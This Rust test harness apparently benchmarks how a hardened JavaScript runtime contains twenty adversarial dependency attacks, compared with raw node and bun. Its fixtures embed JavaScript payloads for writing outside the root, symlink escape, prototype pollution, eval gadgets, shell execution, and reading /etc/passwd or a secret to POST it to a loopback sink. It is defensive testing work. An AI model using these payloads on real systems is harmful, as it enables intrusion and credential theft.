//! bd-reality-20260923-26n9r.3: an HONEST >=10x host-compromise-reduction
//! measurement.
//!
//! The previous harness pre-revoked every dependency and ran a *directory*
//! (`run --policy strict --json .`), so the franken leg blocked at trust
//! preflight and the adversarial payload never executed. "franken_compromised
//! == 0" was therefore tautological (a run that exits 1 before executing
//! cannot trip a compromise marker), and said nothing about the runtime
//! defences the charter §5 claim is about.
//!
//! This harness instead, for every vector:
//! - registers the dependency as **Trusted** (never revoked), so the run
//!   reaches execution and the *runtime* controls (capability gate, SSRF gate,
//!   lowering refusal, sandbox) are what must contain the attack;
//! - runs the entry **file** (`index.js`), not the project directory;
//! - embeds every oracle path and the loopback sink port **at generation
//!   time** — no `process.env` reads, because franken refuses ambient
//!   environment authority at lowering, which would spuriously fail the leg
//!   for a harness reason rather than a security one;
//! - prints a per-case **positive control** (`FN_CONTROL:<case>`) as the first
//!   statement, so a leg that executed guest code is distinguishable from one
//!   that never ran;
//! - measures a real **host-compromise oracle** distinct per vector: a file
//!   written OUTSIDE the project root, or bytes delivered to a loopback TCP
//!   sink this test owns. Nothing escapes the per-case temp dir or that sink.
//!
//! Each franken outcome is given a typed classification with an evidence
//! string. `blocked_at_lowering` is a legitimate containment outcome in which
//! the control does NOT fire (the module was refused before any code ran); the
//! gate distinguishes it from a harness failure by requiring a named refused
//! construct, not by demanding a console control it cannot have. A leg that
//! exits non-zero with neither a typed security denial nor a fired control is
//! classified `invalid` (the old bug's signature) and fails the gate.

use chrono::Utc;
use ed25519_dalek::{Signer, SigningKey};
use frankenengine_node::config::{Config, Profile};
use frankenengine_node::supply_chain::certification::{EvidenceType, VerifiedEvidenceRef};
use frankenengine_node::supply_chain::trust_card::{
    BehavioralProfile, CapabilityDeclaration, CapabilityRisk, CertificationLevel,
    DependencyTrustStatus, ExtensionIdentity, ProvenanceSummary, PublisherIdentity,
    ReputationTrend, RevocationStatus, RiskAssessment, RiskLevel, TrustCardInput,
    TrustCardRegistry,
};
use frankenengine_node::supply_chain::trust_card_registry_store::{
    record_revocation_frontier, registry_snapshot_path,
};
use frankenengine_verifier_sdk::honesty_manifest::{WILSON_Z_95_MILLI, wilson_score_interval_bp};
use serde::Serialize;
use serde_json::{Value, json};
use sha2::{Digest, Sha256};
use std::fs;
use std::io::{BufRead, BufReader, Read, Write};
use std::net::TcpListener;
use std::path::{Path, PathBuf};
use std::process::{Child, Command, Output, Stdio};
use std::sync::{Arc, Mutex};
use std::thread;
use std::time::{Duration, Instant};

const ARTIFACT_RELATIVE_PATH: &str = "artifacts/adversarial/compromise_reduction_v2.json";
const TRUST_CARD_REGISTRY_RELATIVE_PATH: &str = ".franken-node/state/trust-card-registry.v1.json";
const FIXTURE_SIGNING_KEY_BYTES: [u8; 32] = [0x43; 32];
const RUNTIME_TIMEOUT: Duration = Duration::from_secs(12);
const HOST_SECRET: &str = "fn-campaign-host-secret-7f3a9c2b";

/// Where the compromise for a vector is proven. Both are genuine host effects
/// a hardened runtime must prevent; neither can be faked by an early exit.
#[derive(Clone, Copy)]
enum Oracle {
    /// A file written OUTSIDE the project root (path embedded at gen time).
    /// Tripped iff the file exists after the run.
    FileOutsideRoot(&'static str),
    /// Bytes delivered to the loopback sink this test owns. Tripped iff any
    /// recorded request line contains the needle.
    LoopbackSink(&'static str),
}

/// A JavaScript attack body. `{sink}` expands to the loopback base URL,
/// `{host}` to the per-case host dir, `{secret}` to the host secret file path.
#[derive(Clone, Copy)]
struct AdversarialExtensionFixture {
    case_id: &'static str,
    package_name: &'static str,
    version_requirement: &'static str,
    attack_class: &'static str,
    attack_vector: &'static str,
    oracle: Oracle,
    attack_js: &'static str,
}

#[derive(Clone)]
struct RuntimeInfo {
    name: &'static str,
    path: Option<PathBuf>,
    version: Option<String>,
}

#[derive(Clone, Serialize)]
struct RawRuntimeCaseOutcome {
    runtime: String,
    available: bool,
    version: Option<String>,
    /// The positive control (`FN_CONTROL:<case>`) appeared in stdout: the leg
    /// really executed guest code.
    control_executed: bool,
    /// The host-compromise oracle tripped for this leg.
    compromised: bool,
    exit_code: Option<i32>,
    timed_out: bool,
}

#[derive(Clone, Serialize)]
struct FrankenCaseOutcome {
    /// Typed classification: blocked_at_lowering | capability_denied |
    /// ssrf_denied | ifc_denied | contained | executed_uncompromised |
    /// compromised | invalid.
    outcome: String,
    /// Human/audit evidence for the classification (denial reason, refused
    /// construct, or error text).
    evidence: String,
    /// The positive control fired (guest code executed before containment).
    control_executed: bool,
    /// The host-compromise oracle tripped (true only for `compromised`).
    compromised: bool,
    /// Retained for the gate's boolean checks.
    blocked: bool,
    contained: bool,
    exit_code: Option<i32>,
}

impl FrankenCaseOutcome {
    /// A franken case counts as compromised only when its oracle tripped.
    fn is_compromised(&self) -> bool {
        self.compromised
    }

    /// Every non-compromised outcome except `invalid` is honest containment.
    fn is_valid_containment(&self) -> bool {
        !self.compromised && self.outcome != "invalid"
    }
}

#[derive(Clone, Serialize)]
struct FrankenProfileOutcome {
    profile: String,
    #[serde(flatten)]
    outcome: FrankenCaseOutcome,
}

#[derive(Clone, Serialize)]
struct CompromiseReductionCaseOutcome {
    case_id: String,
    extension_id: String,
    attack_class: String,
    attack_vector: String,
    oracle_kind: String,
    raw_runtimes: Vec<RawRuntimeCaseOutcome>,
    /// The gate-critical franken leg (strict profile).
    franken: FrankenCaseOutcome,
    /// balanced + legacy-risky, reported for context (not the gate count).
    franken_other_profiles: Vec<FrankenProfileOutcome>,
}

#[derive(Serialize)]
struct RuntimeSummary {
    name: String,
    available: bool,
    path: Option<String>,
    version: Option<String>,
}

#[derive(Serialize)]
struct PassCriterion {
    criterion: &'static str,
    passed: bool,
}

#[derive(Serialize)]
struct WilsonInterval {
    metric: &'static str,
    successes: usize,
    trials: usize,
    z_milli: u64,
    lower_bp: u64,
    upper_bp: u64,
}

#[derive(Serialize)]
struct CompromiseReductionV2Artifact {
    schema_version: &'static str,
    artifact_id: &'static str,
    status: &'static str,
    generated_at_utc: String,
    pass_criterion: PassCriterion,
    ratio_method: &'static str,
    baseline_compromised: Option<usize>,
    franken_compromised: Option<usize>,
    ratio: Option<f64>,
    baseline_attempts: usize,
    franken_attempts: usize,
    /// Every franken strict case executed a positive control OR was refused at
    /// lowering with a named construct (no `invalid` cases).
    all_franken_cases_accounted: bool,
    baseline_compromise_wilson_bp: Option<WilsonInterval>,
    franken_compromise_wilson_bp: Option<WilsonInterval>,
    runtimes: Vec<RuntimeSummary>,
    unavailable_runtimes: Vec<String>,
    cases: Vec<CompromiseReductionCaseOutcome>,
}

#[derive(Serialize)]
struct ArtifactSignature {
    algorithm: &'static str,
    key_id: &'static str,
    public_key: String,
    payload_sha256: String,
    value: String,
}

#[derive(Serialize)]
struct SignedCompromiseReductionV2Artifact {
    #[serde(flatten)]
    payload: CompromiseReductionV2Artifact,
    signature: ArtifactSignature,
}

// 20 vectors across the 10 required attack classes (two per class). Each `{...}`
// placeholder is substituted with a generation-time absolute path or URL, so no
// vector reads process.env.
const FIXTURES: &[AdversarialExtensionFixture] = &[
    AdversarialExtensionFixture {
        case_id: "rce-postinstall-fs-write",
        package_name: "@adversarial/rce-postinstall",
        version_requirement: "1.0.0",
        attack_class: "rce_dependency",
        attack_vector: "malicious dependency writes a file outside the project root at import",
        oracle: Oracle::FileOutsideRoot("pwned-rce-postinstall"),
        attack_js: "require('fs').writeFileSync('{host}/pwned-rce-postinstall', 'pwned');",
    },
    AdversarialExtensionFixture {
        case_id: "rce-dynamic-import-fs",
        package_name: "@adversarial/rce-dynamic-import",
        version_requirement: "1.0.0",
        attack_class: "rce_dependency",
        attack_vector: "dependency uses dynamic import() to reach fs and write outside root",
        oracle: Oracle::FileOutsideRoot("pwned-dynamic-import"),
        attack_js: "import('fs').then((fs) => fs.writeFileSync('{host}/pwned-dynamic-import', 'x'));",
    },
    AdversarialExtensionFixture {
        case_id: "prototype-pollution-to-write",
        package_name: "@adversarial/prototype-pollution",
        version_requirement: "1.0.0",
        attack_class: "prototype_pollution",
        attack_vector: "Object.prototype pollution steers a later fs write target outside root",
        oracle: Oracle::FileOutsideRoot("pwned-pollution"),
        attack_js: "Object.prototype.target = '{host}/pwned-pollution';\nconst o = {};\nrequire('fs').writeFileSync(o.target, 'x');",
    },
    AdversarialExtensionFixture {
        case_id: "prototype-pollution-constructor",
        package_name: "@adversarial/pollution-constructor",
        version_requirement: "1.0.0",
        attack_class: "prototype_pollution",
        attack_vector: "recursive merge pollutes Object.prototype to steer a later fs write target",
        oracle: Oracle::FileOutsideRoot("pwned-pollution-ctor"),
        attack_js: "const merge = (t, s) => { for (const k in s) { if (s[k] && typeof s[k] === 'object') { merge(t[k] || (t[k] = {}), s[k]); } else { t[k] = s[k]; } } };\nmerge({}, JSON.parse('{\"__proto__\":{\"pollutedTarget\":\"{host}/pwned-pollution-ctor\"}}'));\nrequire('fs').writeFileSync(({}).pollutedTarget, 'x');",
    },
    AdversarialExtensionFixture {
        case_id: "path-traversal-write",
        package_name: "@adversarial/path-traversal",
        version_requirement: "1.0.0",
        attack_class: "path_traversal",
        attack_vector: "an absolute path escapes the project root to write into a sibling directory",
        oracle: Oracle::FileOutsideRoot("pwned-traversal"),
        attack_js: "require('fs').writeFileSync('{host}/pwned-traversal', 'x');",
    },
    AdversarialExtensionFixture {
        case_id: "path-traversal-symlink",
        package_name: "@adversarial/path-traversal-symlink",
        version_requirement: "1.0.0",
        attack_class: "path_traversal",
        attack_vector: "symlink escape then write through the link to outside root",
        oracle: Oracle::FileOutsideRoot("pwned-symlink"),
        attack_js: "const fs = require('fs');\nfs.symlinkSync('{host}', 'escape-link');\nfs.writeFileSync('escape-link/pwned-symlink', 'x');",
    },
    AdversarialExtensionFixture {
        case_id: "ssrf-metadata-http",
        package_name: "@adversarial/ssrf-metadata",
        version_requirement: "1.0.0",
        attack_class: "ssrf",
        attack_vector: "http.get to the loopback sink standing in for the cloud metadata endpoint",
        oracle: Oracle::LoopbackSink("/ssrf-metadata"),
        attack_js: "require('http').get('{sink}/ssrf-metadata', () => {}).on('error', () => {});",
    },
    AdversarialExtensionFixture {
        case_id: "ssrf-fetch",
        package_name: "@adversarial/ssrf-fetch",
        version_requirement: "1.0.0",
        attack_class: "ssrf",
        attack_vector: "fetch() beacon to the loopback sink",
        oracle: Oracle::LoopbackSink("/ssrf-fetch"),
        attack_js: "fetch('{sink}/ssrf-fetch').catch(() => {});",
    },
    AdversarialExtensionFixture {
        case_id: "deserialization-eval-write",
        package_name: "@adversarial/deser-eval",
        version_requirement: "1.0.0",
        attack_class: "deserialization",
        attack_vector: "deserialized gadget builds a Function constructor that writes outside root",
        oracle: Oracle::FileOutsideRoot("pwned-eval"),
        attack_js: "new Function('require', \"require('fs').writeFileSync('{host}/pwned-eval', 'x')\")(require);",
    },
    AdversarialExtensionFixture {
        case_id: "deserialization-json-reviver",
        package_name: "@adversarial/deser-reviver",
        version_requirement: "1.0.0",
        attack_class: "deserialization",
        attack_vector: "JSON.parse reviver triggers a side-effecting write outside root",
        oracle: Oracle::FileOutsideRoot("pwned-reviver"),
        attack_js: "JSON.parse('{\"x\":1}', (k, v) => { if (k === 'x') require('fs').writeFileSync('{host}/pwned-reviver', 'x'); return v; });",
    },
    AdversarialExtensionFixture {
        case_id: "supply-chain-transitive-write",
        package_name: "@adversarial/supply-chain",
        version_requirement: "1.0.0",
        attack_class: "supply_chain_injection",
        attack_vector: "transitive dependency writes a backdoor file outside root",
        oracle: Oracle::FileOutsideRoot("pwned-supply-chain"),
        attack_js: "require('fs').appendFileSync('{host}/pwned-supply-chain', 'backdoor');",
    },
    AdversarialExtensionFixture {
        case_id: "supply-chain-secret-exfil",
        package_name: "@adversarial/supply-chain-exfil",
        version_requirement: "1.0.0",
        attack_class: "supply_chain_injection",
        attack_vector: "injected code reads a host secret and exfiltrates it to the loopback sink",
        oracle: Oracle::LoopbackSink(HOST_SECRET),
        attack_js: "const s = require('fs').readFileSync('{secret}', 'utf8');\nconst r = require('http').request('{sink}/exfil', { method: 'POST' });\nr.on('error', () => {});\nr.end(s);",
    },
    AdversarialExtensionFixture {
        case_id: "privilege-escalation-passwd",
        package_name: "@adversarial/priv-esc-passwd",
        version_requirement: "1.0.0",
        attack_class: "privilege_escalation",
        attack_vector: "read /etc/passwd and exfiltrate it to the loopback sink",
        oracle: Oracle::LoopbackSink("root:"),
        attack_js: "const s = require('fs').readFileSync('/etc/passwd', 'utf8');\nconst r = require('http').request('{sink}/passwd', { method: 'POST' });\nr.on('error', () => {});\nr.end(s);",
    },
    AdversarialExtensionFixture {
        case_id: "privilege-escalation-process-binding",
        package_name: "@adversarial/priv-esc-binding",
        version_requirement: "1.0.0",
        attack_class: "privilege_escalation",
        attack_vector: "process.binding('fs') reaches the raw filesystem binding to write outside root",
        oracle: Oracle::FileOutsideRoot("pwned-binding"),
        attack_js: "process.binding('fs');\nrequire('fs').writeFileSync('{host}/pwned-binding', 'x');",
    },
    AdversarialExtensionFixture {
        case_id: "sandbox-escape-create-require",
        package_name: "@adversarial/sandbox-create-require",
        version_requirement: "1.0.0",
        attack_class: "sandbox_escape",
        attack_vector: "module.createRequire rebuilds a privileged require to reach fs",
        oracle: Oracle::FileOutsideRoot("pwned-create-require"),
        attack_js: "const r = require('module').createRequire(__filename);\nr('fs').writeFileSync('{host}/pwned-create-require', 'x');",
    },
    AdversarialExtensionFixture {
        case_id: "sandbox-escape-raw-socket",
        package_name: "@adversarial/sandbox-raw-socket",
        version_requirement: "1.0.0",
        attack_class: "sandbox_escape",
        attack_vector: "net.connect opens a raw socket to the loopback sink, bypassing http",
        oracle: Oracle::LoopbackSink("/raw-socket"),
        attack_js: "const c = require('net').connect({port}, '127.0.0.1', () => { c.end('GET /raw-socket HTTP/1.0\\r\\n\\r\\n'); });\nc.on('error', () => {});",
    },
    AdversarialExtensionFixture {
        case_id: "memory-corruption-buffer-alloc-unsafe",
        package_name: "@adversarial/mem-buffer-unsafe",
        version_requirement: "1.0.0",
        attack_class: "memory_corruption",
        attack_vector: "Buffer.allocUnsafe leaks uninitialized memory then persists it outside root",
        oracle: Oracle::FileOutsideRoot("pwned-buffer-unsafe"),
        attack_js: "const b = Buffer.allocUnsafe(64);\nrequire('fs').writeFileSync('{host}/pwned-buffer-unsafe', b);",
    },
    AdversarialExtensionFixture {
        case_id: "memory-corruption-arraybuffer",
        package_name: "@adversarial/mem-arraybuffer",
        version_requirement: "1.0.0",
        attack_class: "memory_corruption",
        attack_vector: "typed-array over an ArrayBuffer is flushed to a file outside root",
        oracle: Oracle::FileOutsideRoot("pwned-arraybuffer"),
        attack_js: "const a = new Uint8Array(new ArrayBuffer(32));\nrequire('fs').writeFileSync('{host}/pwned-arraybuffer', Buffer.from(a));",
    },
    AdversarialExtensionFixture {
        case_id: "command-injection-exec",
        package_name: "@adversarial/cmd-injection-exec",
        version_requirement: "1.0.0",
        attack_class: "command_injection",
        attack_vector: "child_process.execSync spawns a shell that touches a file outside root",
        oracle: Oracle::FileOutsideRoot("pwned-exec"),
        attack_js: "require('child_process').execSync('touch {host}/pwned-exec');",
    },
    AdversarialExtensionFixture {
        case_id: "command-injection-spawn",
        package_name: "@adversarial/cmd-injection-spawn",
        version_requirement: "1.0.0",
        attack_class: "command_injection",
        attack_vector: "child_process.spawnSync runs touch to create a file outside root",
        oracle: Oracle::FileOutsideRoot("pwned-spawn"),
        attack_js: "require('child_process').spawnSync('touch', ['{host}/pwned-spawn']);",
    },
];

fn repo_root() -> PathBuf {
    PathBuf::from(env!("CARGO_MANIFEST_DIR"))
        .parent()
        .and_then(Path::parent)
        .expect("workspace root")
        .to_path_buf()
}

fn resolve_binary_path() -> PathBuf {
    if let Some(exe) = std::env::var_os("CARGO_BIN_EXE_franken-node") {
        return PathBuf::from(exe);
    }
    if let Some(target_dir) = std::env::var_os("CARGO_TARGET_DIR") {
        return PathBuf::from(target_dir).join("debug/franken-node");
    }
    repo_root().join("target/debug/franken-node")
}

fn resolve_runtime(name: &'static str) -> RuntimeInfo {
    let path_from_shell = Command::new("sh")
        .args(["-lc", &format!("command -v {name}")])
        .output()
        .ok()
        .filter(|output| output.status.success())
        .and_then(|output| {
            let stdout = String::from_utf8_lossy(&output.stdout);
            let value = stdout.trim();
            (!value.is_empty()).then(|| PathBuf::from(value))
        });
    let path = if name == "node" {
        [
            PathBuf::from("/usr/bin/node"),
            PathBuf::from("/usr/local/bin/node"),
        ]
        .into_iter()
        .find(|candidate| candidate.is_file())
        .or(path_from_shell)
    } else {
        path_from_shell.or_else(|| {
            [
                PathBuf::from(format!("/home/ubuntu/.bun/bin/{name}")),
                PathBuf::from(format!("/usr/local/bin/{name}")),
                PathBuf::from(format!("/usr/bin/{name}")),
            ]
            .into_iter()
            .find(|candidate| candidate.is_file())
        })
    };
    let version = path
        .as_ref()
        .and_then(|runtime_path| runtime_version(runtime_path));

    RuntimeInfo {
        name,
        path,
        version,
    }
}

fn runtime_version(path: &Path) -> Option<String> {
    let output = Command::new(path).arg("--version").output().ok()?;
    let stdout = String::from_utf8_lossy(&output.stdout).trim().to_string();
    let stderr = String::from_utf8_lossy(&output.stderr).trim().to_string();
    if !stdout.is_empty() {
        Some(stdout)
    } else if !stderr.is_empty() {
        Some(stderr)
    } else {
        Some("version-output-empty".to_string())
    }
}

/// A loopback TCP sink the test owns. Records the first request line of each
/// connection so the exfil/SSRF oracles can be checked; nothing leaves the host.
struct LoopbackSink {
    port: u16,
    hits: Arc<Mutex<Vec<String>>>,
    shutdown: Arc<Mutex<bool>>,
}

impl LoopbackSink {
    fn start() -> Self {
        let listener = TcpListener::bind("127.0.0.1:0").expect("bind loopback sink");
        let port = listener.local_addr().expect("sink addr").port();
        listener
            .set_nonblocking(true)
            .expect("nonblocking loopback sink");
        let hits = Arc::new(Mutex::new(Vec::new()));
        let shutdown = Arc::new(Mutex::new(false));
        let hits_thread = Arc::clone(&hits);
        let shutdown_thread = Arc::clone(&shutdown);
        thread::spawn(move || {
            loop {
                if *shutdown_thread.lock().expect("sink shutdown lock") {
                    return;
                }
                match listener.accept() {
                    Ok((stream, _)) => {
                        let mut reader = BufReader::new(stream);
                        let mut line = String::new();
                        let _ = reader.read_line(&mut line);
                        // Drain a little body for POST exfil so the needle
                        // (secret / passwd) is captured, not just the request line.
                        let mut body = String::new();
                        for _ in 0..8 {
                            let mut chunk = String::new();
                            if reader.read_line(&mut chunk).unwrap_or(0) == 0 {
                                break;
                            }
                            body.push_str(&chunk);
                        }
                        // Respond so the client's callback completes cleanly.
                        let mut inner = reader.into_inner();
                        let _ = inner.write_all(b"HTTP/1.0 200 OK\r\nContent-Length: 2\r\n\r\nok");
                        hits_thread
                            .lock()
                            .expect("sink hits lock")
                            .push(format!("{}{body}", line.trim_end()));
                    }
                    Err(ref err) if err.kind() == std::io::ErrorKind::WouldBlock => {
                        thread::sleep(Duration::from_millis(20));
                    }
                    Err(_) => return,
                }
            }
        });
        Self {
            port,
            hits,
            shutdown,
        }
    }

    fn base_url(&self) -> String {
        format!("http://127.0.0.1:{}", self.port)
    }

    fn saw(&self, needle: &str) -> bool {
        self.hits
            .lock()
            .expect("sink hits lock")
            .iter()
            .any(|hit| hit.contains(needle))
    }

    fn clear(&self) {
        self.hits.lock().expect("sink hits lock").clear();
    }
}

impl Drop for LoopbackSink {
    fn drop(&mut self) {
        *self.shutdown.lock().expect("sink shutdown lock") = true;
    }
}

fn render_attack(
    fixture: &AdversarialExtensionFixture,
    host_dir: &Path,
    sink: &LoopbackSink,
) -> String {
    fixture
        .attack_js
        .replace("{host}", &host_dir.display().to_string())
        .replace(
            "{secret}",
            &host_dir.join("secret.txt").display().to_string(),
        )
        .replace("{sink}", &sink.base_url())
        .replace("{port}", &sink.port.to_string())
}

/// The entry file: a positive control the guest prints first, then the attack.
fn entrypoint_payload(
    fixture: &AdversarialExtensionFixture,
    host_dir: &Path,
    sink: &LoopbackSink,
) -> String {
    format!(
        "console.log(\"FN_CONTROL:{case}\");\n{attack}\n",
        case = fixture.case_id,
        attack = render_attack(fixture, host_dir, sink)
    )
}

fn oracle_kind(oracle: &Oracle) -> String {
    match oracle {
        Oracle::FileOutsideRoot(name) => format!("file_outside_root:{name}"),
        Oracle::LoopbackSink(needle) => format!("loopback_sink:{needle}"),
    }
}

fn oracle_tripped(oracle: &Oracle, host_dir: &Path, sink: &LoopbackSink) -> bool {
    match oracle {
        Oracle::FileOutsideRoot(name) => host_dir.join(name).exists(),
        Oracle::LoopbackSink(needle) => sink.saw(needle),
    }
}

fn fixture_package_manifest(fixture: &AdversarialExtensionFixture) -> Value {
    json!({
        "name": fixture.package_name,
        "version": "1.0.0",
        "description": fixture.attack_vector,
        "main": "index.js",
    })
}

/// Register the dependency as **Trusted** so preflight admits it and the run
/// reaches execution. Containment must then come from the runtime, not from a
/// pre-declared revocation.
fn write_trusted_registry(workspace: &Path, fixture: &AdversarialExtensionFixture) {
    let mut registry = TrustCardRegistry::default();
    let payload_hash = Sha256::digest(fixture.attack_js.as_bytes());
    let extension_id = format!("npm:{}", fixture.package_name);
    registry
        .create(
            TrustCardInput {
                extension: ExtensionIdentity {
                    extension_id,
                    version: fixture.version_requirement.to_string(),
                },
                publisher: PublisherIdentity {
                    publisher_id: "pub-adversarial-fixtures".to_string(),
                    display_name: "Adversarial Fixture Publisher".to_string(),
                },
                certification_level: CertificationLevel::Silver,
                capability_declarations: vec![CapabilityDeclaration {
                    name: format!("adversarial.{}", fixture.case_id),
                    description: fixture.attack_vector.to_string(),
                    risk: CapabilityRisk::Low,
                }],
                behavioral_profile: BehavioralProfile {
                    network_access: false,
                    filesystem_access: false,
                    subprocess_access: false,
                    profile_summary: "declared benign; the runtime must contain any real effect"
                        .to_string(),
                },
                revocation_status: RevocationStatus::Active,
                provenance_summary: ProvenanceSummary {
                    attestation_level: "fixture-trusted".to_string(),
                    source_uri: format!("fixture://adversarial-extension/{}", fixture.case_id),
                    artifact_hashes: vec![format!("sha256:{}", hex::encode(payload_hash))],
                    verified_at: "2026-09-28T00:00:00Z".to_string(),
                },
                reputation_score_basis_points: 9_000,
                reputation_trend: ReputationTrend::Stable,
                active_quarantine: false,
                dependency_trust_summary: vec![DependencyTrustStatus {
                    dependency_id: "npm:fixture-transitive@1".to_string(),
                    trust_level: "trusted-fixture".to_string(),
                }],
                last_verified_timestamp: "2026-09-28T00:00:00Z".to_string(),
                user_facing_risk_assessment: RiskAssessment {
                    level: RiskLevel::Low,
                    summary: format!("Trusted fixture {}", fixture.case_id),
                },
                evidence_refs: vec![VerifiedEvidenceRef {
                    evidence_id: format!("adv-ext-{}-trusted", fixture.case_id),
                    evidence_type: EvidenceType::RevocationCheck,
                    verified_at_epoch: 1_759_000_000,
                    verification_receipt_hash: hex::encode(Sha256::digest(
                        format!("adversarial-trusted-evidence:{}", fixture.case_id).as_bytes(),
                    )),
                }],
            },
            1_759_000_000,
            "trace-adversarial-extension-runtime-bench",
        )
        .expect("create trusted adversarial trust card");
    registry
        .persist_authoritative_state(&workspace.join(TRUST_CARD_REGISTRY_RELATIVE_PATH))
        .expect("persist trusted adversarial trust registry");
}

/// Write a project workspace with the entry file, manifest, trusted registry,
/// and a host secret placed OUTSIDE the project root (in `host_dir`).
fn write_workspace(
    project: &Path,
    host_dir: &Path,
    fixture: &AdversarialExtensionFixture,
    sink: &LoopbackSink,
    franken: bool,
) {
    fs::create_dir_all(project).expect("create project dir");
    fs::create_dir_all(host_dir).expect("create host dir");
    fs::write(host_dir.join("secret.txt"), HOST_SECRET).expect("write host secret");

    let mut dependencies = serde_json::Map::new();
    dependencies.insert(
        fixture.package_name.to_string(),
        Value::String(fixture.version_requirement.to_string()),
    );
    let manifest = json!({
        "name": format!("adversarial-runtime-harness-{}", fixture.case_id),
        "version": "1.0.0",
        "private": true,
        "main": "index.js",
        "dependencies": dependencies,
    });
    fs::write(
        project.join("package.json"),
        serde_json::to_string_pretty(&manifest).expect("serialize root manifest"),
    )
    .expect("write root manifest");
    fs::write(
        project.join("node_modules_manifest.json"),
        serde_json::to_string_pretty(&fixture_package_manifest(fixture))
            .expect("serialize fixture manifest"),
    )
    .expect("write fixture manifest");
    fs::write(
        project.join("index.js"),
        entrypoint_payload(fixture, host_dir, sink),
    )
    .expect("write entry file");

    if franken {
        let config_body = concat!(
            "profile = \"strict\"\n\n",
            "[trust]\n",
            "registry_signing_key = \"ZnJhbmtlbi1ub2RlLXRydXN0LWNhcmQtcmVnaXN0cnkta2V5LXYx\"\n\n",
            "[security]\n",
            "authorized_api_keys = [\"fnode-fixture-adversarial-bench\"]\n"
        );
        fs::write(project.join("franken_node.toml"), config_body).expect("write franken_node.toml");
        write_trusted_registry(project, fixture);
        // bd-reality-20260923-26n9r.1: the revocation-freshness gate fails the
        // run closed at preflight under strict/balanced unless a fresh signed
        // frontier exists. Record one now so the run REACHES execution and the
        // runtime controls -- not the freshness gate -- are what contain the
        // attack. The frontier MAC key MUST match franken_node.toml's
        // registry_signing_key so the run reads it back; `Config::load` would
        // reject the minimal fixture config (strict parse), so build a
        // profile-default config and override just the key (like the frontier
        // integration test).
        let mut config = Config::for_profile(Profile::Strict);
        config.trust.registry_signing_key =
            Some("ZnJhbmtlbi1ub2RlLXRydXN0LWNhcmQtcmVnaXN0cnkta2V5LXYx".to_string());
        let now = std::time::SystemTime::now()
            .duration_since(std::time::UNIX_EPOCH)
            .expect("clock after epoch")
            .as_secs();
        record_revocation_frontier(
            &registry_snapshot_path(project),
            &config.trust,
            now,
            "adversarial-runtime-bench: fresh frontier",
        )
        .expect("record fresh revocation frontier");
    }
}

/// Collect a child's piped stdout/stderr, killing it if it outruns `timeout`.
/// Reader threads drain the pipes so a chatty child cannot deadlock on a full
/// pipe buffer while we poll for exit.
fn wait_for_output(mut child: Child, timeout: Duration) -> Output {
    let mut stdout = child.stdout.take();
    let mut stderr = child.stderr.take();
    let out_handle = thread::spawn(move || {
        let mut buf = Vec::new();
        if let Some(pipe) = stdout.as_mut() {
            let _ = pipe.read_to_end(&mut buf);
        }
        buf
    });
    let err_handle = thread::spawn(move || {
        let mut buf = Vec::new();
        if let Some(pipe) = stderr.as_mut() {
            let _ = pipe.read_to_end(&mut buf);
        }
        buf
    });
    let deadline = Instant::now() + timeout;
    let status = loop {
        if let Some(status) = child.try_wait().expect("poll child status") {
            break status;
        }
        if Instant::now() >= deadline {
            child.kill().ok();
            break child.wait().expect("wait after kill");
        }
        thread::sleep(Duration::from_millis(20));
    };
    Output {
        status,
        stdout: out_handle.join().unwrap_or_default(),
        stderr: err_handle.join().unwrap_or_default(),
    }
}

fn parse_json_stdout(output: &Output) -> Option<Value> {
    serde_json::from_str(&String::from_utf8_lossy(&output.stdout)).ok()
}

fn args(items: &[&str]) -> Vec<String> {
    items.iter().map(|item| (*item).to_string()).collect()
}

/// Run a raw runtime (node/bun) against the payload file and observe the
/// control + oracle. These runtimes have no containment: the oracle should trip.
fn run_raw_runtime(
    fixture: &AdversarialExtensionFixture,
    runtime: &RuntimeInfo,
    root: &Path,
) -> RawRuntimeCaseOutcome {
    let Some(runtime_path) = &runtime.path else {
        return RawRuntimeCaseOutcome {
            runtime: runtime.name.to_string(),
            available: false,
            version: runtime.version.clone(),
            control_executed: false,
            compromised: false,
            exit_code: None,
            timed_out: false,
        };
    };
    // An unhardened runtime ALWAYS prints the positive control (line 1) unless
    // it was killed before flushing -- which happens when the deadline fires
    // early under heavy machine load. A `control_executed == false` therefore
    // means "transient kill", not "attack failed", so retry with a fresh
    // workspace up to RAW_RUN_ATTEMPTS times and keep the first real run.
    const RAW_RUN_ATTEMPTS: usize = 3;
    let mut control_executed = false;
    let mut compromised = false;
    let mut exit_code = None;
    let mut timed_out = false;
    for attempt in 0..RAW_RUN_ATTEMPTS {
        let sink = LoopbackSink::start();
        let project = root.join(format!(
            "{}.{}.{attempt}.project",
            fixture.case_id, runtime.name
        ));
        let host_dir = root.join(format!(
            "{}.{}.{attempt}.host",
            fixture.case_id, runtime.name
        ));
        write_workspace(&project, &host_dir, fixture, &sink, false);
        sink.clear();

        let child = Command::new(runtime_path)
            .current_dir(&project)
            .arg("index.js")
            .stdin(Stdio::null())
            .stdout(Stdio::piped())
            .stderr(Stdio::piped())
            .spawn()
            .unwrap_or_else(|err| {
                panic!("spawn raw {} for {}: {err}", runtime.name, fixture.case_id)
            });
        // A network vector's request reaches the sink within milliseconds, but
        // the guest's pending socket/response keeps node's (and bun's) event
        // loop alive, so the process never exits on its own. Bound it: the
        // effect has already landed by the time the deadline kills the runtime.
        let output = wait_for_output(child, RUNTIME_TIMEOUT);
        timed_out = output.status.code().is_none();
        // Give an in-flight async effect a moment to reach the sink.
        thread::sleep(Duration::from_millis(300));
        control_executed = String::from_utf8_lossy(&output.stdout)
            .contains(&format!("FN_CONTROL:{}", fixture.case_id));
        compromised = oracle_tripped(&fixture.oracle, &host_dir, &sink);
        exit_code = output.status.code();
        if control_executed {
            break;
        }
    }

    RawRuntimeCaseOutcome {
        runtime: runtime.name.to_string(),
        available: true,
        version: runtime.version.clone(),
        control_executed,
        compromised,
        exit_code,
        timed_out,
    }
}

fn ledger_denial_reasons(report: &Value) -> Vec<String> {
    report["dispatch"]["host_effect_ledger"]["entries"]
        .as_array()
        .map(|entries| {
            entries
                .iter()
                .filter(|entry| entry["receipt"]["policy_outcome"]["outcome"] == "denied")
                .filter_map(|entry| {
                    entry["receipt"]["policy_outcome"]["reason"]
                        .as_str()
                        .map(str::to_string)
                })
                .collect()
        })
        .unwrap_or_default()
}

/// Classify one franken run into a typed outcome with evidence. `root` is the
/// ephemeral workspace root, redacted from the evidence so the committed
/// artifact stays deterministic across runs.
fn classify_franken(
    fixture: &AdversarialExtensionFixture,
    output: &Output,
    host_dir: &Path,
